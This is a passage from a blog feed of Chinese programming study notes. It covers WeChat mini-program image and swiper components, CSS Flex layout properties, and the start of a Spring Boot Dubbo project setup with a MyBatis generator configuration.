插入图片</h2><p>美观的页面不能光有文字，还必须有图片。小程序的<code>&lt;image&gt;</code>组件就用来加载图片。</p><p>打开<code>index.wxml</code>文件，加入如下代码。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;view&gt;</span><br><span class="line">  &lt;image <span class="attribute">src</span>=&quot;https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-<span class="number">20220114150508149</span>.png<span class="string">&quot; &gt;&lt;/image&gt;</span></span><br><span class="line"><span class="string">&lt;/view&gt;</span></span><br></pre></td></tr></table></figure><p>默认情况下，图片会占满整个容器的宽度（这个例子是<code>&lt;view&gt;</code>的宽度），上面代码通过<code>style</code>属性指定图片的高度和宽度（占据页面宽度的一半），渲染结果如下。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114150920228.png" alt="image-20220114150920228"></p><p>当然，图片样式不一定写在<code>&lt;image&gt;</code>组件里面，也可以写在 WXSS 样式文件里面。</p><h2 id="0x04-图片的轮播"><a href="#0x04-图片的轮播" class="headerlink" title="0x04 图片的轮播"></a>0x04 图片的轮播</h2><p>小程序原生的<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/miniprogram/dev/component/swiper.html"><code>&lt;swiper&gt;</code>组件</a>可以提供图片轮播效果。</p><p>页面的图片上面，有三个提示点，表示一共有三张图片，可以切换显示。</p><p>它的代码很简单，只需要改一下<code>index.wxml</code>文件即可。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;view&gt;</span><br><span class="line">  &lt;swiper</span><br><span class="line">    indicator-dots=&quot;&#123;&#123;true&#125;&#125;&quot;  </span><br><span class="line">    autoplay=&quot;&#123;&#123;true&#125;&#125;&quot;</span><br><span class="line">    style=&quot;<span class="attribute">width</span>: <span class="number">750</span>rpx;&quot;&gt;</span><br><span class="line">    &lt;swiper-item&gt;</span><br><span class="line">      &lt;image <span class="attribute">src</span>=&quot;https://picsum.photos/<span class="number">200</span><span class="string">&quot;&gt;&lt;/image&gt;</span></span><br><span class="line"><span class="string">    &lt;/swiper-item&gt;</span></span><br><span class="line"><span class="string">    &lt;swiper-item&gt;</span></span><br><span class="line"><span class="string">      &lt;image src=&quot;</span>https://picsum.photos/<span class="number">250</span><span class="string">&quot;&gt;&lt;/image&gt;</span></span><br><span class="line"><span class="string">    &lt;/swiper-item&gt;</span></span><br><span class="line"><span class="string">    &lt;swiper-item&gt;</span></span><br><span class="line"><span class="string">      &lt;image src=&quot;</span>https://picsum.photos/<span class="number">300</span><span class="string">&quot;&gt;&lt;/image&gt;</span></span><br><span class="line"><span class="string">    &lt;/swiper-item&gt;</span></span><br><span class="line"><span class="string">  &lt;/swiper&gt;</span></span><br><span class="line"><span class="string">&lt;/view&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114151335385.png" alt="image-20220114151335385"></p><p>上面代码中，<code>&lt;swiper&gt;</code>组件就是轮播组件，里面放置了三个<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/miniprogram/dev/component/swiper-item.html">&#96;&#96;组件</a>，表示有三个轮播项目，每个项目就是一个<code>&lt;image&gt;</code>组件。</p><p><code>&lt;swiper&gt;</code>组件的<code>indicator-dots</code>属性设置是否显示轮播点，<code>autoplay</code>属性设置是否自动播放轮播。它们的属性值都是一个布尔值，这里要写成<code>&#123;&#123;true&#125;&#125;</code>。这种<code>&#123;&#123;...&#125;&#125;</code>的语法，表示里面放置的是 JavaScript 代码。</p>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 小程序 </tag>
            
            <tag> WeChat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序学习笔记 01</title>
      <link href="/2021/08/28/b4442a413577-q1jun/"/>
      <url>/2021/08/28/b4442a413577-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序学习笔记-01"><a href="#微信小程序学习笔记-01" class="headerlink" title="微信小程序学习笔记 01"></a>微信小程序学习笔记 01</h1><h2 id="0x01-总体样式"><a href="#0x01-总体样式" class="headerlink" title="0x01 总体样式"></a>0x01 总体样式</h2><p>微信小程序允许在顶层放置一个<code>app.wxss</code>文件，里面采用 CSS 语法设置页面样式。这个文件的设置，对所有页面都有效。</p><p>注意，小程序虽然使用 CSS 样式，但是样式文件的后缀名一律要写成<code>.wxss</code>。</p><p>在项目顶层新建一个<code>app.wxss</code>文件，内容如下。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">page &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">text &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">24pt</span>;</span><br><span class="line">  <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码将整个页面的背景色设为粉红，然后将<code>&lt;text&gt;</code>标签的字体大小设为 24 磅，字体颜色设为蓝色。</p><p>开发者工具导入代码之后，得到了下面的渲染结果。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114135509030.png" alt="image-20220114135509030"></p><p>可以看到，页面的背景色变成粉红，文本字体变大了，字体颜色变成了蓝色。</p><p>实际开发中，直接对<code>&lt;text&gt;</code>标签设置样式，会影响到所有的文本。一般不这样用，而是通过<code>class</code>属性区分不同类型的文本，然后再对每种<code>class</code>设置样式。</p><p>打开<code>pages/wxml/index.wxml</code>文件，把页面代码改成下面这样。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">block</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>当前时间为：&#123;&#123;time&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，我们为<code>&lt;text&gt;</code>标签加上了一个<code>class</code>属性，值为<code>title</code>。</p><p>然后，将顶层的<code>app.wxss</code>文件改掉，不再直接对<code>&lt;text&gt;</code>设置样式，改成对<code>class</code>设置样式。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**app.wxss**/</span></span><br><span class="line">page &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.title</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">24pt</span>;</span><br><span class="line">  <span class="attribute">color</span>:rebeccapurple;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，样式设置在 class 上面（<code>.title</code>），这样就可以让不同的<code>class</code>呈现不同的样式。修改之后，页面的渲染结果并不会有变化。</p><h2 id="0x02-Flex布局"><a href="#0x02-Flex布局" class="headerlink" title="0x02 Flex布局"></a>0x02 Flex布局</h2><p>各种页面元素的位置关系，称为布局（layout），小程序官方推荐使用 Flex 布局。</p><p>网页布局（layout）是 CSS 的一个重点应用:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071001.gif" alt="img"></p><p>布局的传统解决方案，基于<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/box_model">盒状模型</a>，依赖 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/display"><code>display</code></a> 属性 + <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/position"><code>position</code></a>属性 + <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/float"><code>float</code></a>属性。它对于那些特殊布局非常不方便，比如，<a target="_blank" rel="noopener" href="https://css-tricks.com/centering-css-complete-guide/">垂直居中</a>就不容易实现。</p><p>2009年，W3C 提出了一种新的方案—-Flex 布局，可以简便、完整、响应式地实现各种页面布局。目前，它已经得到了所有浏览器的支持，这意味着，现在就能很安全地使用这项功能。</p><p>支持的浏览器（Browser Support）：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071003.jpg" alt="img"></p><p>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。</p><p>任何一个容器都可以指定为 Flex 布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>行内元素也可以使用 Flex 布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Webkit 内核的浏览器，必须加上<code>-webkit</code>前缀。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: -webkit-flex; <span class="comment">/* Safari */</span></span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意，设为 Flex 布局以后，子元素的<code>float</code>、<code>clear</code>和<code>vertical-align</code>属性将失效。</p></blockquote><h3 id="0x0201-Flex布局的基本概念"><a href="#0x0201-Flex布局的基本概念" class="headerlink" title="0x0201 Flex布局的基本概念"></a>0x0201 Flex布局的基本概念</h3><p>采用 Flex 布局的元素，称为 Flex 容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为 Flex 项目（flex item），简称”项目”。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071004.png" alt="img"></p><p>容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做<code>main start</code>，结束位置叫做<code>main end</code>；交叉轴的开始位置叫做<code>cross start</code>，结束位置叫做<code>cross end</code>。</p><p>项目默认沿主轴排列。单个项目占据的主轴空间叫做<code>main size</code>，占据的交叉轴空间叫做<code>cross size</code>。</p><h3 id="0x0202-Flex布局容器的属性"><a href="#0x0202-Flex布局容器的属性" class="headerlink" title="0x0202 Flex布局容器的属性"></a>0x0202 Flex布局容器的属性</h3><p>以下6个属性设置在容器上。</p><ul><li>flex-direction</li><li>flex-wrap</li><li>flex-flow</li><li>justify-content</li><li>align-items</li><li>align-content</li></ul><h4 id="0x020201-flex-direction"><a href="#0x020201-flex-direction" class="headerlink" title="0x020201 flex-direction"></a>0x020201 flex-direction</h4><p><code>flex-direction</code>属性决定主轴的方向（即项目的排列方向）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071005.png" alt="img"></p><h4 id="0x020202-flex-wrap"><a href="#0x020202-flex-wrap" class="headerlink" title="0x020202 flex-wrap"></a>0x020202 flex-wrap</h4><p>默认情况下，项目都排在一条线（又称”轴线”）上。<code>flex-wrap</code>属性定义，如果一条轴线排不下，如何换行。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071006.png" alt="img"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它可能取三个值。</p><p>（1）<code>nowrap</code>（默认）：不换行。</p><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th></tr></thead></table><p>（2）<code>wrap</code>：换行，第一行在上方。</p><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th></tr></thead><tbody><tr><td>7</td><td>8</td><td>9</td><td>10</td><td></td><td></td></tr></tbody></table><p>（3）<code>wrap-reverse</code>：换行，第一行在下方。</p><table><thead><tr><th>7</th><th>8</th><th>9</th><th>10</th><th></th><th></th></tr></thead><tbody><tr><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td></tr></tbody></table><h4 id="0x020203-flex-flow"><a href="#0x020203-flex-flow" class="headerlink" title="0x020203 flex-flow"></a>0x020203 flex-flow</h4><p><code>flex-flow</code>属性是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式，默认值为<code>row nowrap</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-flow</span>: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x020204-justify-content"><a href="#0x020204-justify-content" class="headerlink" title="0x020204 justify-content"></a>0x020204 justify-content</h4><p><code>justify-content</code>属性定义了项目在主轴上的对齐方式。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: flex-start | flex-end | center | space-between | space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071010.png" alt="img"></p><p>它可能取5个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。</p><ul><li><code>flex-start</code>（默认值）：左对齐</li><li><code>flex-end</code>：右对齐</li><li><code>center</code>： 居中</li><li><code>space-between</code>：两端对齐，项目之间的间隔都相等。</li><li><code>space-around</code>：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</li></ul><h4 id="0x020205-align-items"><a href="#0x020205-align-items" class="headerlink" title="0x020205 align-items"></a>0x020205 align-items</h4><p><code>align-items</code>属性定义项目在交叉轴上如何对齐。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-items</span>: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071011.png" alt="img"></p><p>它可能取5个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。</p><ul><li><code>flex-start</code>：交叉轴的起点对齐。</li><li><code>flex-end</code>：交叉轴的终点对齐。</li><li><code>center</code>：交叉轴的中点对齐。</li><li><code>baseline</code>: 项目的第一行文字的基线对齐。</li><li><code>stretch</code>（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。</li></ul><h4 id="0x020206-align-content"><a href="#0x020206-align-content" class="headerlink" title="0x020206 align-content"></a>0x020206 align-content</h4><p><code>align-content</code>属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-content</span>: flex-start | flex-end | center | space-between | space-around | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071012.png" alt="img"></p><p>该属性可能取6个值。</p><ul><li><code>flex-start</code>：与交叉轴的起点对齐。</li><li><code>flex-end</code>：与交叉轴的终点对齐。</li><li><code>center</code>：与交叉轴的中点对齐。</li><li><code>space-between</code>：与交叉轴两端对齐，轴线之间的间隔平均分布。</li><li><code>space-around</code>：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。</li><li><code>stretch</code>（默认值）：轴线占满整个交叉轴。</li></ul><h3 id="0x0203-Flex布局项目的属性"><a href="#0x0203-Flex布局项目的属性" class="headerlink" title="0x0203 Flex布局项目的属性"></a>0x0203 Flex布局项目的属性</h3><p>以下6个属性设置在项目上。</p><ul><li><code>order</code></li><li><code>flex-grow</code></li><li><code>flex-shrink</code></li><li><code>flex-basis</code></li><li><code>flex</code></li><li><code>align-self</code></li></ul><h4 id="0x020301-order"><a href="#0x020301-order" class="headerlink" title="0x020301 order"></a>0x020301 order</h4><p><code>order</code>属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">order</span>: &lt;integer&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071013.png" alt="img"></p><h4 id="0x020302-flex-grow"><a href="#0x020302-flex-grow" class="headerlink" title="0x020302 flex-grow"></a>0x020302 flex-grow</h4><p><code>flex-grow</code>属性定义项目的放大比例，默认为<code>0</code>，即如果存在剩余空间，也不放大。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: &lt;number&gt;; <span class="comment">/* default 0 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071014.png" alt="img"></p><p>如果所有项目的<code>flex-grow</code>属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的<code>flex-grow</code>属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。</p><h4 id="0x020303-flex-shrink"><a href="#0x020303-flex-shrink" class="headerlink" title="0x020303 flex-shrink"></a>0x020303 flex-shrink</h4><p><code>flex-shrink</code>属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: &lt;number&gt;; <span class="comment">/* default 1 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071015.jpg" alt="img"></p><p>如果所有项目的<code>flex-shrink</code>属性都为1，当空间不足时，都将等比例缩小。如果一个项目的<code>flex-shrink</code>属性为0，其他项目都为1，则空间不足时，前者不缩小。</p><p>负值对该属性无效。</p><h4 id="0x020304-flex-basis"><a href="#0x020304-flex-basis" class="headerlink" title="0x020304 flex-basis"></a>0x020304 flex-basis</h4><p><code>flex-basis</code>属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为<code>auto</code>，即项目的本来大小。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-basis</span>: &lt;length&gt; | auto; <span class="comment">/* default auto */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它可以设为跟<code>width</code>或<code>height</code>属性一样的值（比如350px），则项目将占据固定空间。</p><h4 id="0x020305-flex"><a href="#0x020305-flex" class="headerlink" title="0x020305 flex"></a>0x020305 flex</h4><p><code>flex</code>属性是<code>flex-grow</code>, <code>flex-shrink</code> 和 <code>flex-basis</code>的简写，默认值为<code>0 1 auto</code>。后两个属性可选。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: none | [ &lt;<span class="string">&#x27;flex-grow&#x27;</span>&gt; &lt;<span class="string">&#x27;flex-shrink&#x27;</span>&gt;? || &lt;<span class="string">&#x27;flex-basis&#x27;</span>&gt; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该属性有两个快捷值：<code>auto</code> (<code>1 1 auto</code>) 和 none (<code>0 0 auto</code>)。</p><p>建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。</p><h4 id="0x020306-align-self"><a href="#0x020306-align-self" class="headerlink" title="0x020306 align-self"></a>0x020306 align-self</h4><p><code>align-self</code>属性允许单个项目有与其他项目不一样的对齐方式，可覆盖<code>align-items</code>属性。默认值为<code>auto</code>，表示继承父元素的<code>align-items</code>属性，如果没有父元素，则等同于<code>stretch</code>。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">align-self</span>: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/bg2015071016.png" alt="img"></p><p>该属性可能取6个值，除了auto，其他都与align-items属性完全一致。</p>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 小程序 </tag>
            
            <tag> WeChat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 11</title>
      <link href="/2021/08/15/439a96847eed-q1jun/"/>
      <url>/2021/08/15/439a96847eed-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot-学习笔记-11"><a href="#Spring-Boot-学习笔记-11" class="headerlink" title="Spring Boot 学习笔记 11"></a>Spring Boot 学习笔记 11</h1><h2 id="0x01-Dubbo-SSM框架"><a href="#0x01-Dubbo-SSM框架" class="headerlink" title="0x01 Dubbo-SSM框架"></a>0x01 Dubbo-SSM框架</h2><p><em>接口工程：</em><br>    存放实体Bean和业务接口<br>_服务提供者：_它是一个Springboot框架web项目，集成MyBatis，Redis</p><ul><li>添加依赖：Mybatis依赖，Mysql驱动依赖，Dubbo依赖，zookeeper依赖，Redis依赖</li><li>配置Springboot核心配置文件<ul><li>配置连接数据库</li><li>配置连接redis数据库dubbo<br>  _服务消费者：_它是一个Springboot框架web项目，集成JSP，dubbo</li></ul></li><li>添加依赖：Dubbo，zookeeper依赖，解析JSP页面的依赖，接口工程</li><li>配置Springboot核心配置文件<ul><li>配置试图解析器</li><li>配置dubbo</li></ul></li></ul><h2 id="0x02-构建Dubbo-SSM框架"><a href="#0x02-构建Dubbo-SSM框架" class="headerlink" title="0x02 构建Dubbo-SSM框架"></a>0x02 构建Dubbo-SSM框架</h2><p><em><strong>First and formost</strong></em>（首先），我们依次创建Maven接口项目工程、Springboot+Maven服务提供者（Provider）项目工程、Springboot+Maven服务消费者（Consumer）项目工程。</p><p><em><strong>In addition</strong></em>（其次），我们在提供者（Provider）项目工程文件下添加一个Mybatis逆向工程的配置文件GeneratorMapper.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">generatorConfiguration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定连接数据库的 JDBC 驱动包所在位置，指定到你本机的完整路径 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classPathEntry</span> <span class="attr">location</span>=<span class="string">&quot;D:\mysql-connector-java-5.1.38.jar&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置 table 表信息内容体，targetRuntime 指定采用 MyBatis3 的版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">&quot;tables&quot;</span> <span class="attr">targetRuntime</span>=<span class="string">&quot;MyBatis3&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 抑制生成注释，由于生成的注释都是英文的，可以不让它生成 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suppressAllComments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置数据库连接信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">connectionURL</span>=<span class="string">&quot;jdbc:mysql://192.168.154.128:3306/springboot&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">userId</span>=<span class="string">&quot;root&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">password</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 生成 model 类，targetPackage 指定 model 类的包名， targetProject 指定</span></span><br><span class="line"><span class="comment">        生成的 model 放在 eclipse 的哪个工程下面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.bjpowernode.springboot.model&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">targetProject</span>=<span 